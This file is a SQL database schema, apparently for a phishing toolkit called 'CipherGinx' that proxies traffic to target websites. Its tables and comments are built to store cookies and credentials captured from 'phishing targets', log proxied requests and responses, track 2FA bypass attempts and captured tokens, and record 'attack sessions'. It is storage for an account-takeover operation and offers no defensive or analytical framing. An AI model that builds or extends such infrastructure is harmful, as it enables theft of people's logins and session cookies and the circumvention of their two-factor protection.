-- CipherGinx PHP Database Schema
-- Clean, well-structured schema for credential capture and logging

-- ============================================
-- CAPTURED COOKIES TABLE
-- ============================================
CREATE TABLE IF NOT EXISTS `captured_cookies` (
  `id` INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
  `name` VARCHAR(255) NOT NULL COMMENT 'Cookie name',
  `value` LONGTEXT NOT NULL COMMENT 'Cookie value',
  `domain` VARCHAR(255) COMMENT 'Cookie domain',
  `path` VARCHAR(255) DEFAULT '/' COMMENT 'Cookie path',
  `expires` VARCHAR(255) COMMENT 'Expiration date',
  `secure` BOOLEAN DEFAULT FALSE COMMENT 'Secure flag',
  `httponly` BOOLEAN DEFAULT FALSE COMMENT 'HttpOnly flag',
  `samesite` VARCHAR(10) DEFAULT 'Lax' COMMENT 'SameSite attribute',
  `captured_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP COMMENT 'When cookie was captured',
  `source_ip` VARCHAR(45) COMMENT 'Source IP address',
  `user_agent` TEXT COMMENT 'User agent string',
  INDEX `idx_domain` (`domain`),
  INDEX `idx_captured_at` (`captured_at`),
  INDEX `idx_name` (`name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
COMMENT='Captured cookies from phishing targets';

-- ============================================
-- CAPTURED CREDENTIALS TABLE
-- ============================================
CREATE TABLE IF NOT EXISTS `captured_credentials` (
  `id` INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
  `username` VARCHAR(255) COMMENT 'Captured username/email',
  `password` TEXT COMMENT 'Captured password (encrypted recommended)',
  `form_data` LONGTEXT COMMENT 'Full form submission data (JSON)',
  `target_domain` VARCHAR(255) NOT NULL COMMENT 'Target website domain',
  `source_ip` VARCHAR(45) COMMENT 'Source IP address',
  `user_agent` TEXT COMMENT 'User agent string',
  `referer` VARCHAR(2083) COMMENT 'HTTP Referer header',
  `captured_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP COMMENT 'When credentials were captured',
  `status` ENUM('pending', 'verified', 'failed') DEFAULT 'pending' COMMENT 'Verification status',
  INDEX `idx_target_domain` (`target_domain`),
  INDEX `idx_captured_at` (`captured_at`),
  INDEX `idx_source_ip` (`source_ip`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
COMMENT='Captured user credentials and form submissions';

-- ============================================
-- HTTP REQUESTS LOG TABLE
-- ============================================
CREATE TABLE IF NOT EXISTS `http_requests` (
  `id` INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
  `method` VARCHAR(10) NOT NULL COMMENT 'HTTP method (GET, POST, etc)',
  `path` VARCHAR(2083) COMMENT 'Request path',
  `query_string` LONGTEXT COMMENT 'Query string parameters',
  `headers` LONGTEXT COMMENT 'Request headers (JSON)',
  `body` LONGTEXT COMMENT 'Request body',
  `source_ip` VARCHAR(45) COMMENT 'Client IP address',
  `user_agent` TEXT COMMENT 'User agent string',
  `target_domain` VARCHAR(255) COMMENT 'Target domain being proxied',
  `logged_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP COMMENT 'When request was logged',
  INDEX `idx_method` (`method`),
  INDEX `idx_path` (`path`(100)),
  INDEX `idx_logged_at` (`logged_at`),
  INDEX `idx_source_ip` (`source_ip`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
COMMENT='All HTTP requests passing through proxy';

-- ============================================
-- HTTP RESPONSES LOG TABLE
-- ============================================
CREATE TABLE IF NOT EXISTS `http_responses` (
  `id` INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
  `request_id` INT UNSIGNED COMMENT 'Foreign key to http_requests',
  `status_code` INT DEFAULT 200 COMMENT 'HTTP status code',
  `headers` LONGTEXT COMMENT 'Response headers (JSON)',
  `body` LONGTEXT COMMENT 'Response body (truncated if too large)',
  `response_size` INT UNSIGNED COMMENT 'Full response size in bytes',
  `response_time_ms` INT COMMENT 'Time taken to receive response',
  `logged_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP COMMENT 'When response was logged',
  FOREIGN KEY (`request_id`) REFERENCES `http_requests`(`id`) ON DELETE CASCADE,
  INDEX `idx_status_code` (`status_code`),
  INDEX `idx_logged_at` (`logged_at`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
COMMENT='HTTP responses from target server';

-- ============================================
-- 2FA BYPASS ATTEMPTS TABLE
-- ============================================
CREATE TABLE IF NOT EXISTS `2fa_bypass_attempts` (
  `id` INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
  `username` VARCHAR(255) COMMENT 'Target username',
  `target_domain` VARCHAR(255) NOT NULL COMMENT 'Target domain',
  `2fa_method` VARCHAR(100) COMMENT '2FA method detected (SMS, TOTP, etc)',
  `bypass_technique` VARCHAR(255) COMMENT 'Technique used for bypass attempt',
  `captured_token` VARCHAR(255) COMMENT 'Captured 2FA token if any',
  `success` BOOLEAN DEFAULT FALSE COMMENT 'Whether bypass was successful',
  `source_ip` VARCHAR(45) COMMENT 'Source IP address',
  `attempt_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP COMMENT 'When attempt was made',
  INDEX `idx_target_domain` (`target_domain`),
  INDEX `idx_username` (`username`),
  INDEX `idx_success` (`success`),
  INDEX `idx_attempt_at` (`attempt_at`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
COMMENT='2FA bypass attempts and results';

-- ============================================
-- SESSIONS TABLE
-- ============================================
CREATE TABLE IF NOT EXISTS `sessions` (
  `id` INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
  `session_id` VARCHAR(255) UNIQUE NOT NULL COMMENT 'Unique session identifier',
  `source_ip` VARCHAR(45) COMMENT 'Client IP address',
  `user_agent` TEXT COMMENT 'User agent string',
  `target_domain` VARCHAR(255) NOT NULL COMMENT 'Target being attacked',
  `proxy_config` VARCHAR(255) COMMENT 'Configuration file used',
  `status` ENUM('active', 'completed', 'failed') DEFAULT 'active' COMMENT 'Session status',
  `credentials_captured` BOOLEAN DEFAULT FALSE COMMENT 'Whether credentials were captured',
  `cookies_captured` INT DEFAULT 0 COMMENT 'Number of cookies captured',
  `started_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP COMMENT 'Session start time',
  `ended_at` TIMESTAMP NULL COMMENT 'Session end time',
  INDEX `idx_source_ip` (`source_ip`),
  INDEX `idx_target_domain` (`target_domain`),
  INDEX `idx_status` (`status`),
  INDEX `idx_started_at` (`started_at`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
COMMENT='Active and completed attack sessions';

-- ============================================
-- PROXY EVENTS LOG TABLE
-- ============================================
CREATE TABLE IF NOT EXISTS `proxy_events` (
  `id` INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
  `event_type` VARCHAR(50) NOT NULL COMMENT 'Type of event (request, response, error, etc)',
  `severity` ENUM('debug', 'info', 'warning', 'error', 'critical') DEFAULT 'info',
  `message` TEXT NOT NULL COMMENT 'Event message',
  `context` LONGTEXT COMMENT 'Additional context data (JSON)',
  `source_ip` VARCHAR(45) COMMENT 'Associated IP address if any',
  `target_domain` VARCHAR(255) COMMENT 'Associated domain if any',
  `logged_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP COMMENT 'When event was logged',
  INDEX `idx_event_type` (`event_type`),
  INDEX `idx_severity` (`severity`),
  INDEX `idx_logged_at` (`logged_at`),
  INDEX `idx_source_ip` (`source_ip`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
COMMENT='Proxy server events and debugging logs';

-- ============================================
-- CREATE INDEXES FOR PERFORMANCE
-- ============================================
CREATE INDEX IF NOT EXISTS `idx_credentials_created` ON `captured_credentials` (`captured_at` DESC);
CREATE INDEX IF NOT EXISTS `idx_cookies_created` ON `captured_cookies` (`captured_at` DESC);
CREATE INDEX IF NOT EXISTS `idx_combined_search` ON `captured_credentials` (`target_domain`, `captured_at`);
